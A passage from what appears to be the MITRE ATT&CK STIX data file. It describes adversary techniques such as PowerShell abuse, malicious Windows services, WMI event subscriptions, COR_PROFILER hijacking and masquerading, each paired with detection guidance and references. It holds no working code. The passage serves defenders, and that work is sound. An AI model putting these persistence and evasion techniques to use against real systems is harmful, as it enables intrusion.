                    "description": "Atkinson, J., Winchester, R. (2017, December 7). A Process is No One: Hunting for Token Manipulation. Retrieved December 21, 2017.",
                    "url": "https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-05-28T14:56:23.748Z",
            "name": "PowerShell",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Module: Module Load",
                "Process: Process Creation",
                "Script: Script Execution"
            ],
            "x_mitre_version": "1.1",
            "created": "2020-03-09T13:48:55.078Z",
            "x_mitre_contributors": [
                "Praetorian"
            ],
            "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "User",
                "Administrator"
            ],
            "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_remote_support": true,
            "x_mitre_detection": "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1059/001",
                    "external_id": "T1059.001",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "TechNet PowerShell",
                    "description": "Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.",
                    "url": "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx"
                },
                {
                    "source_name": "Github PSAttack",
                    "description": "Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.",
                    "url": "https://github.com/jaredhaight/PSAttack"
                },
                {
                    "url": "http://www.sixdub.net/?p=367",
                    "description": "Warner, J.. (2015, January 6). Inexorable PowerShell \u2013 A Red Teamer\u2019s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.",
                    "source_name": "Sixdub PowerPick Jan 2016"
                },
                {
                    "url": "https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",
                    "description": "Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.",
                    "source_name": "SilentBreak Offensive PS Dec 2015"
                },
                {
                    "url": "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/",
                    "description": "Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.",
                    "source_name": "Microsoft PSfromCsharp APR 2014"
                },
                {
                    "source_name": "Malware Archaeology PowerShell Cheat Sheet",
                    "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
                    "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf"
                },
                {
                    "source_name": "FireEye PowerShell Logging 2016",
                    "description": "Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.",
                    "url": "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-07-26T17:13:07.345Z",
            "name": "Windows Command Shell",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Process: Process Creation"
            ],
            "x_mitre_version": "1.2",
            "created": "2020-03-09T14:12:31.196Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_permissions_required": [
                "User"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
            "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_remote_support": true,
            "x_mitre_detection": "Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1059/003",
                    "external_id": "T1059.003",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/windows/terminal/tutorials/ssh",
                    "description": "Microsoft. (2020, May 19). Tutorial: SSH in Windows Terminal. Retrieved July 26, 2021.",
                    "source_name": "SSH in Windows"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2020-09-16T15:49:58.490Z",
            "name": "Windows Service",
            "x_mitre_data_sources": [
                "Service: Service Creation",
                "Service: Service Modification",
                "Process: Process Creation",
                "Process: OS API Execution",
                "Command: Command Execution",
                "Windows Registry: Windows Registry Key Creation",
                "Windows Registry: Windows Registry Key Modification"
            ],
            "x_mitre_version": "1.1",
            "created": "2020-01-17T19:13:50.402Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                }
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075). \n\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\n\nAn adversary may also incorporate [Masquerading](https://attack.mitre.org/techniques/T1036) by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). ",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Matthew Demaske, Adaptforward",
                "Travis Smith, Tripwire",
                "Pedro Harrison"
            ],
            "x_mitre_effective_permissions": [
                "Administrator",
                "SYSTEM"
            ],
            "x_mitre_detection": "Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1543/003",
                    "external_id": "T1543.003",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/478.html",
                    "external_id": "CAPEC-478",
                    "source_name": "capec"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/550.html",
                    "external_id": "CAPEC-550",
                    "source_name": "capec"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/551.html",
                    "external_id": "CAPEC-551",
                    "source_name": "capec"
                },
                {
                    "source_name": "TechNet Services",
                    "description": "Microsoft. (n.d.). Services. Retrieved June 7, 2016.",
                    "url": "https://technet.microsoft.com/en-us/library/cc772408.aspx"
                },
                {
                    "source_name": "TechNet Autoruns",
                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
                },
                {
                    "source_name": "Microsoft 4697 APR 2017",
                    "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.",
                    "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697"
                },
                {
                    "source_name": "Microsoft Windows Event Forwarding FEB 2018",
                    "description": "Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.",
                    "url": "https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Windows Management Instrumentation Event Subscription",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Process: Process Creation",
                "WMI: WMI Creation"
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-10-16T20:11:13.719Z",
            "created": "2020-01-24T14:07:56.276Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                }
            ],
            "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "Administrator",
                "SYSTEM"
            ],
            "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. (Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
            "x_mitre_contributors": [
                "Brent Murphy, Elastic",
                "David French, Elastic"
            ],
            "x_mitre_detection": "Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. (Citation: TechNet Autoruns) (Citation: Medium Detecting WMI Persistence) Monitor for the creation of new WMI <code>EventFilter</code>, <code>EventConsumer</code>, and <code>FilterToConsumerBinding</code> events. Event ID 5861 is logged on Windows 10 systems when new <code>EventFilterToConsumerBinding</code> events are created.(Citation: Elastic - Hunting for Persistence Part 1)\n\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet (Citation: Microsoft Register-WmiEvent), as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1546/003",
                    "external_id": "T1546.003",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Mandiant M-Trends 2015",
                    "description": "Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016.",
                    "url": "https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf"
                },
                {
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
                    "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.",
                    "source_name": "FireEye WMI SANS 2015"
                },
                {
                    "source_name": "FireEye WMI 2015",
                    "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"
                },
                {
                    "source_name": "Dell WMI Persistence",
                    "description": "Dell SecureWorks Counter Threat Unit\u2122 (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016.",
                    "url": "https://www.secureworks.com/blog/wmi-persistence"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-",
                    "description": "Satran, M. (2018, May 30). Managed Object Format (MOF). Retrieved January 24, 2020.",
                    "source_name": "Microsoft MOF May 2018"
                },
                {
                    "source_name": "TechNet Autoruns",
                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
                },
                {
                    "source_name": "Medium Detecting WMI Persistence",
                    "description": "French, D. (2018, October 9). Detecting & Removing an Attacker\u2019s WMI Persistence. Retrieved October 11, 2019.",
                    "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96"
                },
                {
                    "url": "https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1",
                    "description": "French, D., Murphy, B. (2020, March 24). Adversary tradecraft 101: Hunting for persistence using Elastic Security (Part 1). Retrieved December 21, 2020.",
                    "source_name": "Elastic - Hunting for Persistence Part 1"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1",
                    "description": "Microsoft. (n.d.). Retrieved January 24, 2020.",
                    "source_name": "Microsoft Register-WmiEvent"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-07-20T21:51:45.776Z",
            "name": "Exploit Public-Facing Application",
            "x_mitre_data_sources": [
                "Application Log: Application Log Content",
                "Network Traffic: Network Traffic Content"
            ],
            "x_mitre_version": "2.3",
            "created": "2018-04-18T17:59:24.739Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "initial-access"
                }
            ],
            "x_mitre_platforms": [
                "Windows",
                "IaaS",
                "Network",
                "Linux",
                "macOS",
                "Containers"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
            "description": "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), network device administration and management protocols (like SNMP and Smart Install(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). \n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Yossi Weizman, Azure Defender Research Team",
                "Praetorian"
            ],
            "x_mitre_detection": "Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1190",
                    "external_id": "T1190",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "NVD CVE-2016-6662",
                    "description": "National Vulnerability Database. (2017, February 2). CVE-2016-6662 Detail. Retrieved April 3, 2018.",
                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-6662"
                },
                {
                    "source_name": "CIS Multiple SMB Vulnerabilities",
                    "description": "CIS. (2017, May 15). Multiple Vulnerabilities in Microsoft Windows SMB Server Could Allow for Remote Code Execution. Retrieved April 3, 2018.",
                    "url": "https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/"
                },
                {
                    "url": "https://us-cert.cisa.gov/ncas/alerts/TA18-106A",
                    "description": "US-CERT. (2018, April 20). Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
                    "source_name": "US-CERT TA18-106A Network Infrastructure Devices 2018"
                },
                {
                    "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
                    "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
                    "source_name": "Cisco Blog Legacy Device Attacks"
                },
                {
                    "source_name": "NVD CVE-2014-7169",
                    "description": "National Vulnerability Database. (2017, September 24). CVE-2014-7169 Detail. Retrieved April 3, 2018.",
                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-7169"
                },
                {
                    "source_name": "OWASP Top 10",
                    "description": "OWASP. (2018, February 23). OWASP Top Ten Project. Retrieved April 3, 2018.",
                    "url": "https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project"
                },
                {
                    "url": "https://cwe.mitre.org/top25/index.html",
                    "description": "Christey, S., Brown, M., Kirby, D., Martin, B., Paller, A.. (2011, September 13). 2011 CWE/SANS Top 25 Most Dangerous Software Errors. Retrieved April 10, 2019.",
                    "source_name": "CWE top 25"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "COR_PROFILER",
            "x_mitre_data_sources": [
                "Windows Registry: Windows Registry Key Modification",
                "Process: Process Creation",
                "Module: Module Load",
                "Command: Command Execution"
            ],
            "x_mitre_version": "1.0",
            "modified": "2021-08-30T21:35:12.049Z",
            "created": "2020-06-24T22:30:55.843Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335",
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "User",
                "Administrator"
            ],
            "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
            "x_mitre_contributors": [
                "Jesse Brown, Red Canary"
            ],
            "x_mitre_detection": "For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1574/012",
                    "external_id": "T1574.012",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview",
                    "description": "Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020.",
                    "source_name": "Microsoft Profiling Mar 2017"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)",
                    "description": "Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020.",
                    "source_name": "Microsoft COR_PROFILER Feb 2013"
                },
                {
                    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
                    "description": "Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.",
                    "source_name": "RedCanary Mockingbird May 2020"
                },
                {
                    "url": "https://redcanary.com/blog/cor_profiler-for-persistence/",
                    "description": "Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020.",
                    "source_name": "Red Canary COR_PROFILER May 2020"
                },
                {
                    "url": "https://offsec.almond.consulting/UAC-bypass-dotnet.html",
                    "description": "Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020.",
                    "source_name": "Almond COR_PROFILER Apr 2019"
                },
                {
                    "url": "https://github.com/OmerYa/Invisi-Shell",
                    "description": "Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020.",
                    "source_name": "GitHub OmerYa Invisi-Shell"
                },
                {
                    "url": "https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html",
                    "description": "Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020.",
                    "source_name": "subTee .NET Profilers May 2017"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-04-20T19:23:37.762Z",
            "name": "Match Legitimate Name or Location",
            "x_mitre_data_sources": [
                "Image: Image Metadata",
                "File: File Metadata",
                "Process: Process Metadata"
            ],
            "x_mitre_version": "1.1",
            "created": "2020-02-10T20:43:10.239Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "x_mitre_defense_bypassed": [
                "Application control by file name or path"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows",
                "Containers"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
            "description": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Yossi Weizman, Azure Defender Research Team",
                "Vishwas Manral, McAfee"
            ],
            "x_mitre_detection": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nIn containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1036/005",
                    "external_id": "T1036.005",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/177.html",
                    "external_id": "CAPEC-177",
                    "source_name": "capec"
                },
                {
                    "url": "http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf",
